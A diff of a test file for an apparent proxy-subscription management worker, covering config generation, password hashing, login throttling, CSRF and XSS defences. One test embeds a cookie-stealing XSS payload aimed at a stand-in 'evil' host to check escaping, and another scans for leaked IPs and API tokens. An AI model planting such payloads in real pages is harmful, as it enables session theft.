@@ -14,7 +14,7 @@ global.CONF = {
   delete: async k => { delete KV[k] },
 }
 eval(fs.readFileSync(require('path').join(__dirname,'..','worker.js'), 'utf8') +
-  '\n;global.__t={genClash,genSB,genShare,parseProxyLine,REGIONS,JUNK,unquote,applyNaming,DEFAULT_POLICIES,PRESETS,policyDomains,resolveTarget,policyMembers,resolveTargets,targetList,DEFAULT_NODES,shareLink,adminHTML,aiPrimary,applyProfile,DEFAULT_PROFILES,profilePolicies,DEFAULT_SETTINGS,parseUserinfo,parseNotes,mergeMeta,JUNK,toBytes,splitFeed,looksBase64,b64decode,scrub,flagRegion,parseShareLine,parseBlockNode,parsePasted,feedParse,triesMsg,feedFormat,nestFlow,parseFlow,toSB,regionOf,apiRoute,hmac,sessionSecret,sha256,makeCookie,DEFAULT_NODES,resolveChains,chainLandingWarn,resolveTarget,contentDisposition,DEFAULT_DNS,DNS_GROUPS,shareToOwn,genSR,detectFmt}')
+  '\n;global.__t={genClash,genSB,genShare,parseProxyLine,REGIONS,JUNK,unquote,applyNaming,DEFAULT_POLICIES,PRESETS,policyDomains,resolveTarget,policyMembers,resolveTargets,targetList,DEFAULT_NODES,shareLink,adminHTML,aiPrimary,applyProfile,DEFAULT_PROFILES,profilePolicies,DEFAULT_SETTINGS,parseUserinfo,parseNotes,mergeMeta,JUNK,toBytes,splitFeed,looksBase64,b64decode,scrub,flagRegion,parseShareLine,parseBlockNode,parsePasted,feedParse,triesMsg,feedFormat,nestFlow,parseFlow,toSB,regionOf,apiRoute,hmac,sessionSecret,sha256,makeCookie,DEFAULT_NODES,resolveChains,chainLandingWarn,resolveTarget,contentDisposition,DEFAULT_DNS,DNS_GROUPS,shareToOwn,genSR,detectFmt,hashPassword,verifyPassword,safeEq,usageOf,renderSub,matchRules,groupMembers,matchHost,inCidr4,libRefs,handle,adminRoute,BACKUP_KEYS,recordHit,strictLost,sessCookie,ipBucket,loginGate,ruleSource,flowVal,cleanDomain,splitDomains,ruleName,sbPorts,ssPlugin,ownToSB,sbDnsServer,sbTransport,kvOut,parseSSBody,collectFlow,realityOk}')
 const T = global.__t
 
 let pass = 0, fail = 0
@@ -36,7 +36,7 @@ for (const line of text.split('\n')) {
 const up = T.applyNaming(raw, {}).filter(n => !n.off)
 const P = T.DEFAULT_POLICIES, LIB = T.PRESETS
 // 测试用的自有节点与站点设置（代码里已不含任何真实站点信息）
-const OWN = { usV2:{name:'自建-A',type:'vless',s:'node.example.com',p:443,u:'11111111-2222-3333-4444-555555555555',sni:'www.bing.com',pk:'PUBKEYPLACEHOLDER0000000000000000000000000',sid:'0123456789abcdef',net:'tcp',flow:'xtls-rprx-vision'}, usH:{name:'自建-B',type:'hysteria2',s:'node.example.com',p:8443,ports:'50000-50020',u:'11111111-2222-3333-4444-555555555555',sni:'node.example.com',obfs:'salamander',opwd:'obfspass'} }
+const OWN = { usV2:{name:'自建-A',type:'vless',s:'node.example.com',p:443,u:'11111111-2222-3333-4444-555555555555',sni:'www.bing.com',pk:'PUBKEYPLACEHOLDER00000000000000000000000000',sid:'0123456789abcdef',net:'tcp',flow:'xtls-rprx-vision'}, usH:{name:'自建-B',type:'hysteria2',s:'node.example.com',p:8443,ports:'50000-50020',u:'11111111-2222-3333-4444-555555555555',sni:'node.example.com',obfs:'salamander',opwd:'obfspass'} }
 const SET = { domain:'sub.example.com', directDomains:['api.example.com'], directIPs:['203.0.113.10'] }
 
 sec('1. 节点解析')
@@ -614,6 +614,26 @@ sec('18. 源码不含站点信息（开源前置检查）')
   // 部署脚本不得内嵌账号信息
   ok(!/ACCOUNT="[0-9a-f]{32}"/.test(dep), '部署脚本无硬编码 Account ID')
   ok(!/\$HOME|~\/[.\w]/.test(dep), '部署脚本不引用本机私有路径')
+
+  // 测试、开发脚本、README、演示页同样会被公开。以前只扫上面三个文件，
+  // 一台真实服务器的 IP 就这么写进测试用例、跟着推上了公开仓库
+  const path = require('path'), root = path.join(__dirname, '..')
+  const extra = ['test/run.cjs', 'test/e2e.mjs', 'README.md', 'docs/demo.html', 'dev/server.mjs', 'dev/fixtures.mjs',
+    'scripts/build-demo.mjs', 'scripts/shots.mjs', 'scripts/cdp.mjs', '.github/workflows/test.yml']
+    .filter(f => fs.existsSync(path.join(root, f)))
+  const leaks = []
+  for (const f of extra) {
+    const text = fs.readFileSync(path.join(root, f), 'utf8').replace(/\b[A-Za-z][\w.]*\/\d+(?:\.\d+)+/g, '')
+    for (const ip of text.match(/\b(\d{1,3}\.){3}\d{1,3}\b/g) || []) {
+      // 1.2.3.x、4.3.2.1 这类是人人都认得的占位写法
+      // 公共 DNS（114、Quad9、OpenDNS、阿里、腾讯、Cloudflare/Google 备用）也是公开服务，不算泄露
+      if (SAFE_IP.test(ip) || /^(1\.2\.3\.\d+|4\.3\.2\.1|\d+\.\d+\.\d+\.0)$/.test(ip)) continue
+      if (/^(114\.114\.1(14|15)\.1(14|15)|9\.9\.9\.9|149\.112\.112\.112|208\.67\.22[02]\.22[02]|223\.6\.6\.6|119\.28\.28\.28|180\.76\.76\.76|1\.0\.0\.1|8\.8\.4\.4)$/.test(ip)) continue
+      leaks.push(f + ' → ' + ip)
+    }
+    if (/\bcf[a-z]{2}_[A-Za-z0-9]{20,}/.test(text)) leaks.push(f + ' → Cloudflare API token')
+  }
+  ok(extra.length >= 8 && leaks.length === 0, `测试、开发脚本、README、演示页里也没有真实 IP 与 token（扫了 ${extra.length} 个文件）` + (leaks.length ? '：' + leaks.slice(0, 3).join('，') : ''))
 }
 
 
@@ -904,27 +924,29 @@ sec('26. 入站格式：分享链接 / 块式 YAML')
   // 机场按 UA 给什么格式全凭它高兴。只认一种的后果是「换个 UA 重试」
   // 和「粘贴导入」这两条退路一起失效 —— 链接被 403 挡住时就彻底没辙了。
   const P = T.parseShareLine
+  // 分享链接里取出的字符串值现在一律带 JSON 引号（防 YAML 把 *abc / 0888 当别的类型），比较前先 unquote
+  const U = x => T.unquote(x === undefined ? '' : x)
 
   const vl = P('vless://11111111-2222-3333-4444-555555555555@a.example.invalid:443?type=ws&security=tls&sni=s.example.invalid&fp=chrome&host=h.example.invalid&path=%2Fray#%E6%97%A5%E6%9C%AC01')
-  ok(vl && vl.type === 'vless' && vl.server === 'a.example.invalid' && vl.port === '443', 'vless 基本字段')
+  ok(vl && vl.type === 'vless' && U(vl.server) === 'a.example.invalid' && vl.port === '443', 'vless 基本字段')
   ok(vl && vl._name === '日本01', 'fragment urldecode 成节点名')
-  ok(vl && vl.network === 'ws' && /path: \/ray/.test(vl['ws-opts']) && /Host: h\.example\.invalid/.test(vl['ws-opts']), 'vless ws 传输层')
-  ok(vl && vl.servername === 's.example.invalid' && vl['client-fingerprint'] === 'chrome', 'sni 映射到 servername')
+  ok(vl && vl.network === 'ws' && T.parseFlow(vl['ws-opts']).path === '/ray' && T.parseFlow(vl['ws-opts']).headers.Host === 'h.example.invalid', 'vless ws 传输层')
+  ok(vl && U(vl.servername) === 's.example.invalid' && U(vl['client-fingerprint']) === 'chrome', 'sni 映射到 servername')
 
   const re = P('vless://11111111-2222-3333-4444-555555555555@b.example.invalid:443?security=reality&pbk=-PLACEHOLDERPUBKEY0000&sid=0123456789abcdef&flow=xtls-rprx-vision#R')
-  ok(re && re.flow === 'xtls-rprx-vision', 'reality 的 flow')
-  ok(re && /public-key: '-PLACEHOLDERPUBKEY0000'/.test(re['reality-opts']), "以 '-' 开头的 public-key 自动加引号")
+  ok(re && U(re.flow) === 'xtls-rprx-vision', 'reality 的 flow')
+  ok(re && /public-key: (["'])-PLACEHOLDERPUBKEY0000\1/.test(re['reality-opts']), "以 '-' 开头的 public-key 自动加引号")
 
   const tj = P('trojan://pwd@[2001:db8::1]:443?sni=s.example.invalid&allowInsecure=1#IPv6')
-  ok(tj && tj.server === '2001:db8::1', 'IPv6 方括号已剥离')
-  ok(tj && tj.sni === 's.example.invalid' && tj['skip-cert-verify'] === 'true', 'trojan 用 sni 字段名')
+  ok(tj && U(tj.server) === '2001:db8::1', 'IPv6 方括号已剥离')
+  ok(tj && U(tj.sni) === 's.example.invalid' && tj['skip-cert-verify'] === 'true', 'trojan 用 sni 字段名')
 
   const hy = P('hysteria2://pwd@c.example.invalid:35000/?insecure=1&sni=s.example.invalid&obfs=salamander&obfs-password=op&mport=35000-39000#US')
-  ok(hy && hy.type === 'hysteria2' && hy.ports === '35000-39000' && hy.obfs === 'salamander', 'hysteria2 含端口跳跃与 obfs')
+  ok(hy && hy.type === 'hysteria2' && U(hy.ports) === '35000-39000' && U(hy.obfs) === 'salamander', 'hysteria2 含端口跳跃与 obfs')
 
-  ok(P('ss://YWVzLTI1Ni1nY206cGFzc3dvcmQ@d.example.invalid:8388#SS').cipher === 'aes-256-gcm', 'ss SIP002 格式')
+  ok(U(P('ss://YWVzLTI1Ni1nY206cGFzc3dvcmQ@d.example.invalid:8388#SS').cipher) === 'aes-256-gcm', 'ss SIP002 格式')
   const ssOld = 'ss://' + Buffer.from('aes-256-gcm:password@e.example.invalid:8388', 'utf8').toString('base64') + '#SSOld'
-  ok(P(ssOld) && P(ssOld).server === 'e.example.invalid', 'ss 整串 base64 的老格式')
+  ok(P(ssOld) && U(P(ssOld).server) === 'e.example.invalid', 'ss 整串 base64 的老格式')
 
   const vm = 'vmess://' + Buffer.from(JSON.stringify({v:'2',ps:'VM01',add:'f.example.invalid',port:'443',id:'11111111-2222-3333-4444-555555555555',aid:'0',net:'ws',host:'h.example.invalid',path:'/vm',tls:'tls'}), 'utf8').toString('base64')
   const vmn = P(vm)
@@ -971,7 +993,7 @@ sec('26. 入站格式：分享链接 / 块式 YAML')
   const s1 = T.splitFeed(asShare), s2 = T.splitFeed(asYaml)
   ok(s1.nodes.length === s2.nodes.length && s1.nodes.length === 2, '两种格式节点数一致')
   ok(s1.nodes.map(n => n._name).join() === s2.nodes.map(n => n._name).join(), '两种格式节点名一致')
-  ok(s1.nodes[0].network === s2.nodes[0].network && s1.nodes[0]['ws-opts'] === s2.nodes[0]['ws-opts'], '两种格式传输层一致')
+  ok(s1.nodes[0].network === s2.nodes[0].network && JSON.stringify(T.parseFlow(s1.nodes[0]['ws-opts'])) === JSON.stringify(T.parseFlow(s2.nodes[0]['ws-opts'])), '两种格式传输层一致')
 
   // base64 包裹的分享链接：浏览器直接打开订阅链接看到的就是这个
   const wrapped = Buffer.from(asShare, 'utf8').toString('base64')
@@ -1088,7 +1110,7 @@ sec('29. sing-box：不支持的协议不得留下悬空引用')
   ok(wsOut && wsOut.transport.path === '/ray' && wsOut.transport.headers.Host === 'example.invalid', '上游 vless+ws 转出 transport')
   ok(wsOut && wsOut.tls && wsOut.tls.server_name === 'example.invalid', 'servername 映射到 tls.server_name')
   const reOut = upVless.find(o => o.tls && o.tls.reality)
-  ok(reOut && reOut.tls.reality.public_key === '-PLACEHOLDERPUBKEY000000000000000000000000', 'reality-opts 转出 public_key')
+  ok(reOut && reOut.tls.reality.public_key === '-PLACEHOLDERPUBKEY0000000000000000000000000', 'reality-opts 转出 public_key')
   ok(reOut && reOut.tls.reality.short_id === '0123456789abcdef', 'reality-opts 转出 short_id')
   ok(reOut && reOut.flow === 'xtls-rprx-vision', 'vision flow 带过去')
   const vmOut = sd.outbounds.find(o => o.type === 'vmess')
@@ -1274,7 +1296,8 @@ sec('33. 修改密码')
 
   r = await call({ oldPassword: 'oldpass123', newPassword: 'newpass123' }, cookie)
   ok(r.body.ok === true, '旧密码正确则允许修改')
-  ok(JSON.parse(KV['auth:password']) === await sha('newpass123'), '新密码已落库（存的是哈希）')
+  ok((await T.verifyPassword('newpass123', JSON.parse(KV['auth:password']))).ok, '新密码已落库（存的是哈希）')
+  ok(/^pbkdf2\$/.test(JSON.parse(KV['auth:password'])), '新密码用加盐的 PBKDF2 存储')
   ok(JSON.parse(KV['auth:password']) !== 'newpass123', '绝不存明文')
 
   // 换了密码，别处的会话就该作废，否则改了等于没改
@@ -1507,7 +1530,7 @@ sec('37. 订阅名下发给客户端')
   ok(cd('很长'.repeat(100)).length < 700, '超长名字会被截断')
 
   const src = fs.readFileSync(require('path').join(__dirname, '..', 'worker.js'), 'utf8')
-  ok(/'Content-Disposition': contentDisposition\(prof\.name\)/.test(src), '订阅响应用档案名作为下发名')
+  ok(/'Content-Disposition': contentDisposition\(prof\.name[,)]/.test(src), '订阅响应用档案名作为下发名')
 }
 
 sec('38. 本站域名的 DNS 解析必须可信')
@@ -1600,14 +1623,15 @@ sec('39. DNS 可在管理端配置')
   const sb = JSON.parse(T.genSB([], P, LIB, T.DEFAULT_NODES, mk({ remote: ['https://doh.opendns.com/dns-query'], bootstrap: ['114.114.114.114'] })))
   const byTag = {}
   sb.dns.servers.forEach(s => { byTag[s.tag] = s })
-  ok(byTag['dns-remote'].address === 'https://doh.opendns.com/dns-query', 'sing-box 境外 DNS 跟随配置')
-  ok(byTag['dns-resolver'].address === '114.114.114.114', 'sing-box 引导 DNS 跟随配置')
+  // 1.12 起 DNS server 是 type + server(+path) 的新格式，没有 address 字段了（1.14 直接拒绝旧格式）
+  ok(byTag['dns-remote'].type === 'https' && byTag['dns-remote'].server === 'doh.opendns.com' && !byTag['dns-remote'].address, 'sing-box 境外 DNS 跟随配置')
+  ok(byTag['dns-resolver'].type === 'udp' && byTag['dns-resolver'].server === '114.114.114.114', 'sing-box 引导 DNS 跟随配置')
   const selfRule = sb.dns.rules.find(r => (r.domain_suffix || []).includes('example.com'))
   ok(selfRule && selfRule.server === 'dns-remote', 'sing-box 本站域名同样走境外组（此前写死为国内明文）')
   const sb2 = JSON.parse(T.genSB([], P, LIB, T.DEFAULT_NODES, mk({ selfGroup: 'domestic' })))
   ok(sb2.dns.rules.find(r => (r.domain_suffix || []).includes('example.com')).server === 'dns-direct', 'sing-box 本站域名分组可改')
   const sb3 = JSON.parse(T.genSB([], P, LIB, T.DEFAULT_NODES, mk({ fakeIp: false })))
-  ok(!sb3.dns.fakeip, 'sing-box 关掉 fake-ip')
+  ok(!sb3.dns.fakeip && !sb3.dns.servers.some(s => s.type === 'fakeip') && !sb3.dns.rules.some(r => r.server === 'dns-fake'), 'sing-box 关掉 fake-ip')
 
   // 老配置里没有 dns 字段，不能整块塌掉
   const legacy = { domain: 'example.com', directDomains: [], directIPs: [] }
@@ -1713,7 +1737,8 @@ sec('42. 强制代理域名')
 
   // sing-box 同样的顺序
   const sb = JSON.parse(T.genSB([], P, LIB, T.DEFAULT_NODES, st))
-  const r0 = sb.route.rules[0]
+  // 最前面是嗅探 / DNS 劫持 / 内网直连这几条动作规则；强制代理必须是第一条按域名匹配的规则
+  const r0 = sb.route.rules.find(r => r.domain_suffix)
   ok(r0 && (r0.domain_suffix || []).includes('relay.example.com') && r0.outbound === '🚀 节点选择', 'sing-box 里也排在第一条')
   const dr = sb.route.rules.find(r => r.outbound === 'direct-out' && (r.domain_suffix || []).length)
   ok(dr && !dr.domain_suffix.includes('relay.example.com'), 'sing-box 的直连规则里不含它')
@@ -1970,7 +1995,7 @@ sec('49. 自有节点的服务器地址不得被改写')
     b: { name: '香港', type: 'hysteria2', s: 'hk2.example.com', p: 8443, u: 'pwd', sni: 'hk2.example.com', obfs: 'salamander', opwd: 'o' },
     c: { name: '直填IP', type: 'hysteria2', s: '203.0.113.9', p: 8443, u: 'pwd', sni: 's', obfs: 'salamander', opwd: 'o' },
   }
-  const st = { ...T.DEFAULT_SETTINGS, domain: 'sub.example.com', directIPs: ['104.194.69.137'], directDomains: [] }
+  const st = { ...T.DEFAULT_SETTINGS, domain: 'sub.example.com', directIPs: ['198.51.100.137'], directDomains: [] }
   const cy = T.genClash(false, [], P, LIB, own, st)
   const d = yaml ? yaml.load(cy) : null
   if (d) {
@@ -1979,7 +2004,7 @@ sec('49. 自有节点的服务器地址不得被改写')
     ok(byName['美西'].server === 'cloud.example.com', '第一台的地址原样下发')
     ok(byName['香港'].server === 'hk2.example.com', '第二台指向自己的域名，不被第一个直连 IP 顶掉')
     ok(byName['直填IP'].server === '203.0.113.9', '直接填 IP 的照常')
-    ok(!d.proxies.some(p => p.server === '104.194.69.137'), '没有任何节点被替换成 directIPs[0]')
+    ok(!d.proxies.some(p => p.server === '198.51.100.137'), '没有任何节点被替换成 directIPs[0]')
 
     // 对症的做法：把节点域名排除出 fake-ip，而不是拿一个 IP 覆盖所有节点
     const f = d.dns['fake-ip-filter'] || []
@@ -2153,6 +2178,415 @@ sec('54. 订阅编辑：出错留在弹窗里')
   ok(/订阅列表还没加载出来/.test(body), '列表没加载到时不打开，免得残缺数组覆盖全部订阅')
 }
 
+// ===================== 本轮新增：安全、订阅页、规则测试、备份 =====================
+const sess70 = async () => { const exp = String(Date.now() + 3600e3); return 'sess=' + encodeURIComponent(exp + '.' + await T.hmac(await T.sessionSecret(), exp)) }
+const call70 = async (path, body, extra) => {
+  const h = { Cookie: await sess70() }
+  if (body !== undefined) h['Content-Type'] = 'application/json'
+  Object.assign(h, extra || {})
+  const req = new Request('https://x' + path, body !== undefined ? { method: 'POST', headers: h, body: JSON.stringify(body) } : { headers: h })
+  const r = await T.apiRoute(req, new URL('https://x' + path), { waitUntil () {} })
+  return { status: r.status, body: await r.clone().json().catch(() => null), headers: r.headers }
+}
+const keep70 = keys => { const o = {}; for (const k of keys) o[k] = KV[k]; return () => { for (const k of keys) { if (o[k] === undefined) delete KV[k]; else KV[k] = o[k] } } }
+
+sec('70. 管理端 XSS：不可信内容不得进入内联事件的 JS 字符串')
+{
+  // 机场节点名、机场名都由第三方控制。只做 HTML 转义的值放进 onclick="f('…')"，
+  // 浏览器解析属性时会把 &#39; 还原成单引号，恰好闭合 JS 字符串 —— 实测一次点击就能外带全部 token。
+  const ui = T.adminHTML(true, true)
+  const js = ui.slice(ui.indexOf('<script>'), ui.lastIndexOf('</script>'))
+  const bad = [...js.matchAll(/on\w+="[^"]*'\$\{esc\(/g)].map(m => m[0].slice(0, 50))
+  ok(bad.length === 0, '内联事件里没有「单引号 + esc()」的拼法' + (bad.length ? '：' + bad[0] : ''))
+  ok(!/setAttribute\('onclick'/.test(js), '不再用 setAttribute 拼内联事件')
+  ok(/const jsq = s => esc\(JSON\.stringify\(String\(s\)\)\)/.test(js), '有专门的 JS 字符串编码函数')
+  ok(/onclick="toggle\(this\)"/.test(js), '节点开关只传 this，key 从 data-k 读')
+  const sum = js.slice(js.indexOf('function sumOf'), js.indexOf('function ago'))
+  ok(/esc\(\(opts\.find/.test(sum), 'sumOf 输出的名字经过转义')
+  // jsq 的实际效果：闭合引号的企图被编码掉
+  const esc = s => String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]))
+  const jsq = s => esc(JSON.stringify(String(s)))
+  const evil = `x');fetch('//evil/'+document.cookie);('`
+  const attr = jsq(evil).replace(/&quot;/g, '"').replace(/&#39;/g, "'").replace(/&amp;/g, '&')
+  ok(JSON.parse(attr) === evil, 'jsq 编码后属性值解码回来仍是同一个字符串字面量')
+  // 每个内联事件调用的函数都得存在，拼错名字就是点了没反应
+  const code = js.split('\n').filter(l => !/^\s*\/\//.test(l)).join('\n')   // 注释里的示例不算
+  const called = new Set([...code.matchAll(/on(?:click|input|keydown)="(?:event\.stopPropagation\(\);)?\s*(?:if\([^)]*\))?\s*([A-Za-z_]\w*)\(/g)].map(m => m[1]))
+  const skip = new Set(['this', 'event', 'if'])
+  const missing = [...called].filter(f => !skip.has(f) && !new RegExp('(window\\.' + f + ' =|function ' + f + '\\()').test(js))
+  ok(missing.length === 0, '内联事件调用的函数都已定义' + (missing.length ? '：' + missing.join(', ') : `（${called.size} 个）`))
+}
+
+sec('71. 密码：加盐 PBKDF2，老哈希登录时无感升级')
+{
+  const h1 = await T.hashPassword('correct horse'), h2 = await T.hashPassword('correct horse')
+  ok(/^pbkdf2\$\d+\$[\w-]+\$[\w-]+$/.test(h1), '哈希串带算法、迭代次数、盐')
+  ok(h1 !== h2, '同一密码两次哈希结果不同（有盐）')
+  ok((await T.verifyPassword('correct horse', h1)).ok, '正确密码校验通过')
+  ok(!(await T.verifyPassword('wrong horse', h1)).ok, '错误密码校验失败')
+  const legacy = await T.sha256('oldpass123')
+  const v = await T.verifyPassword('oldpass123', legacy)
+  ok(v.ok && v.legacy, '老的无盐 sha256 仍能登录，并标记需要升级')
+  ok(!(await T.verifyPassword('x', 'pbkdf2$999999999$aa$bb')).ok, '超出上限的迭代次数直接拒绝，不去算')
+  ok(T.safeEq('abc', 'abc') && !T.safeEq('abc', 'abd') && !T.safeEq('abc', 'abcd'), 'safeEq 定长比较结果正确')
+
+  const restore = keep70(['auth:password', 'auth:fail:198.51.100.7', 'auth:fail:unknown'])
+  KV['auth:password'] = JSON.stringify(legacy)
+  const login = async (pw, ip) => {
+    const h = { 'Content-Type': 'application/json' }
+    if (ip) h['CF-Connecting-IP'] = ip
+    const req = new Request('https://x/admin/login', { method: 'POST', headers: h, body: JSON.stringify({ password: pw }) })
+    const r = await T.adminRoute(req, new URL('https://x/admin/login'))
+    return { status: r.status, body: await r.json(), cookie: r.headers.get('Set-Cookie') || '' }
+  }
+  let r = await login('oldpass123', '198.51.100.7')
+  ok(r.status === 200 && /^sess=/.test(r.cookie), '老哈希能正常登录')
+  ok(/^pbkdf2\$/.test(JSON.parse(KV['auth:password'])), '登录后已升级为 PBKDF2')
+  ok(/HttpOnly/.test(r.cookie) && /SameSite=Lax/.test(r.cookie) && /Secure/.test(r.cookie), 'https 下 cookie 带 HttpOnly / Secure / SameSite')
+
+  // 连续输错锁定
+  for (let i = 0; i < 5; i++) r = await login('bad-' + i, '198.51.100.7')
+  ok(r.status === 401 && /锁定/.test(r.body.msg), '第 5 次输错提示已锁定')
+  r = await login('oldpass123', '198.51.100.7')
+  ok(r.status === 429, '锁定期间密码对了也进不去')
+  r = await login('oldpass123', '203.0.113.99')
+  ok(r.status === 200, '别的 IP 不受影响')
+  // 只认平台给的 IP：X-Forwarded-For 伪造不了新身份
+  delete KV['auth:fail:unknown']
+  for (let i = 0; i < 5; i++) {
+    const req = new Request('https://x/admin/login', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Forwarded-For': '10.0.0.' + i }, body: JSON.stringify({ password: 'nope' }) })
+    r = { status: (await T.adminRoute(req, new URL('https://x/admin/login'))).status }
+  }
+  const req6 = new Request('https://x/admin/login', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Forwarded-For': '10.0.0.99' }, body: JSON.stringify({ password: 'nope' }) })
+  ok((await T.adminRoute(req6, new URL('https://x/admin/login'))).status === 429, '换 X-Forwarded-For 绕不过限速')
+  restore()
+}
+
+sec('72. 会话、跨站与登出')
+{
+  // 畸形 cookie 以前会让 decodeURIComponent 抛异常，整个管理端 1101
+  const bad = new Request('https://x/api/state', { headers: { Cookie: 'sess=%E0%A4%A.x' } })
+  ok(await T.apiRoute(bad, new URL('https://x/api/state'), null).then(r => r.status) === 401, '畸形 cookie 当作未登录，不抛异常')
+  let r = await call70('/api/sessions', {}, { Origin: 'https://evil.example' })
+  ok(r.status === 403, '跨站 Origin 的写操作被拒')
+  const noJson = new Request('https://x/api/sessions', { method: 'POST', headers: { Cookie: await sess70(), 'Content-Type': 'text/plain' }, body: '{}' })
+  ok((await T.apiRoute(noJson, new URL('https://x/api/sessions'), null)).status === 403, '不是 JSON 的写请求被拒（跨站表单发不出 JSON）')
+  const restore = keep70(['auth:secret'])
+  const before = KV['auth:secret']
+  r = await call70('/api/sessions', {})
+  ok(r.status === 200 && KV['auth:secret'] !== before, '让其它设备下线 = 轮换签名密钥')
+  ok(/^sess=/.test(r.headers.get('Set-Cookie') || ''), '当前设备换发新 cookie')
+  restore()
+  const getOut = await T.adminRoute(new Request('https://x/admin/logout'), new URL('https://x/admin/logout'))
+  ok(getOut.status === 302 && !getOut.headers.get('Set-Cookie'), 'GET 登出不清 cookie（防 <img> 跨站踢人）')
+  const formOut = await T.adminRoute(new Request('https://x/admin/logout', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }), new URL('https://x/admin/logout'))
+  ok(formOut.status === 403, '跨站表单发来的登出被拒')
+  const postOut = await T.adminRoute(new Request('https://x/admin/logout', { method: 'POST', headers: { 'Content-Type': 'application/json' } }), new URL('https://x/admin/logout'))
+  ok(postOut.status === 204 && /Max-Age=0/.test(postOut.headers.get('Set-Cookie') || ''), '本站页面的 POST 登出清 cookie')
+  const httpCk = T.sessCookie('v', new Request('http://sub.example.com/admin')), localCk = T.sessCookie('v', new Request('http://localhost:8787/admin'))
+  ok(/Secure/.test(httpCk) && !/Secure/.test(localCk), '只有本机调试去掉 Secure，线上即便走 http 也带 Secure')
+  const page = await T.adminRoute(new Request('https://x/admin'), new URL('https://x/admin'))
+  const csp = page.headers.get('Content-Security-Policy') || ''
+  ok(/connect-src 'self'/.test(csp) && /frame-ancestors 'none'/.test(csp), '管理端有 CSP（限制外连、禁止嵌套）')
+  ok(page.headers.get('Referrer-Policy') === 'no-referrer' && page.headers.get('Cache-Control') === 'no-store', '不外泄 Referer、不缓存')
+}
+
+sec('73. 订阅端点：短 token、图标请求、真实用量')
+{
+  const ev = { waitUntil () {} }
+  const st = async u => (await T.handle(new Request(u), ev)).status
+  ok(await st('https://x/?token=') === 403, '空 token 直接 403')
+  ok(await st('https://x/sub?token=short') === 403, '短于 16 位的 token 直接 403')
+  ok(await st('https://x/favicon.ico') === 204, '图标请求不掉进订阅逻辑')
+  ok(/Disallow: \//.test(await (await T.handle(new Request('https://x/robots.txt'), ev)).text()), 'robots.txt 禁止收录')
+  const prof = { ups: 'all' }
+  const ups = [{ id: 'a', enabled: true }, { id: 'b', enabled: true }, { id: 'c', enabled: false }]
+  const meta = { a: { up: 1, down: 9, total: 100, expire: 2000 }, b: { up: 0, down: 50, total: 200, expire: 1500 }, c: { up: 0, down: 0, total: 999, expire: 1 } }
+  ok(T.usageOf(prof, ups, meta) === 'upload=1; download=59; total=300; expire=1500', '流量相加、到期取最早、停用的源不算')
+  ok(T.usageOf({ ups: ['a'] }, ups, meta) === 'upload=1; download=9; total=100; expire=2000', '只算这份订阅包含的机场')
+  ok(T.usageOf(prof, ups, {}) === '', '一家都拿不到用量时不编数字')
+  // 重置订阅一律换新 token：沿用 SETUP_TOKEN 会让之前因泄露换掉的那个地址重新生效
+  const restore = keep70(['profiles'])
+  const r = await call70('/api/profiles', { act: 'reset' })
+  ok(r.body.ok && r.body.profiles.every(p => /^[A-Za-z0-9_-]{16,64}$/.test(p.token)), '重置订阅后每份都有合法的新 token')
+  // 手动部署（没有 SETUP_TOKEN）时默认订阅的 token 是空串：第一次打开订阅页就生成并落库
+  delete KV['profiles']
+  const g = await call70('/api/profiles')
+  ok(g.body.profiles.every(p => /^[A-Za-z0-9_-]{16,64}$/.test(p.token)) && !!KV['profiles'], '默认订阅没有 token 时自动生成一个并保存')
+  restore()
+}
+
+sec('74. 拉取记录：节流与配额')
+{
+  const restore = keep70(['hits:p70'])
+  delete KV['hits:p70']
+  const prof = { id: 'p70' }
+  const req = (ua, ip) => new Request('https://x/sub', { headers: { 'User-Agent': ua, 'CF-Connecting-IP': ip } })
+  await T.recordHit(prof, req('clash-verge/v2.0.0', '203.0.113.1'), 'clash')
+  await T.recordHit(prof, req('clash-verge/v2.0.0', '203.0.113.1'), 'clash')
+  let h = JSON.parse(KV['hits:p70'])
+  ok(h.list.length === 1 && h.writes === 1, '同一客户端半小时内只记一次')
+  await T.recordHit(prof, req('Shadowrocket/2070', '198.51.100.2'), 'shadowrocket')
+  h = JSON.parse(KV['hits:p70'])
+  ok(h.list.length === 2 && h.list[0].ua.startsWith('Shadowrocket'), '新客户端记在最前面')
+  h.writes = 60; KV['hits:p70'] = JSON.stringify(h)
+  await T.recordHit(prof, req('curl/8', '192.0.2.9'), 'clash')
+  ok(JSON.parse(KV['hits:p70']).list.length === 2, '当天写满 60 次后不再写（防外泄 token 被刷光 KV 配额）')
+  restore()
+}
+
+sec('75. 规则测试')
+{
+  const y = T.genClash(false, up, P, LIB, OWN, SET)
+  const m = q => T.matchRules(y, q)
+  let r = m('https://www.youtube.com/watch?v=1')
+  ok(r.q === 'www.youtube.com' && r.target === '📺 YouTube' && r.type === 'DOMAIN-SUFFIX', '网址剥成主机名，命中 YouTube')
+  ok(m('youtubei.googleapis.com').target === '📺 YouTube', '具体的 youtubei 先于宽泛的 googleapis')
+  r = m('203.0.113.10')
+  ok(r.kind === 'ip' && r.target === 'DIRECT' && /IP-CIDR/.test(r.rule), '直连 IP 命中 IP-CIDR')
+  ok(m('api.example.com').target === 'DIRECT', '直连域名命中')
+  r = m('some-unknown-site.org')
+  ok(r.type === 'MATCH' && r.target === '🚀 节点选择', '没命中的落到 MATCH 兜底')
+  ok(r.unsure.some(u => u.type === 'GEOSITE') && r.unsure.some(u => u.type === 'GEOIP'), '兜底前的 GEOSITE/GEOIP 列为「判断不了」')
+  ok(T.matchHost('[2001:db8::1]:443') === '2001:db8::1' && T.matchHost('user@Example.COM:8080/x') === 'example.com', '主机名提取：IPv6、端口、用户信息')
+  ok(T.inCidr4('10.1.2.3', '10.0.0.0/8') && !T.inCidr4('192.0.2.1', '10.0.0.0/8') && T.inCidr4('1.2.3.4', '1.2.3.4'), 'IPv4 CIDR 判断')
+  const mem = T.groupMembers(y, '📺 YouTube')
+  ok(mem[0] === '🇯🇵 日本' && mem.includes('🚀 节点选择'), '能读出分组成员，第一个是默认项')
+  ok(T.groupMembers(y, 'DIRECT').length === 0, 'DIRECT 没有成员')
+  const r2 = await call70('/api/match', { q: '' })
+  ok(r2.status === 400, '空输入给出提示')
+}
+
+sec('76. 订阅预览与策略引用')
+{
+  const restore = keep70(['profiles', 'lib', 'policies'])
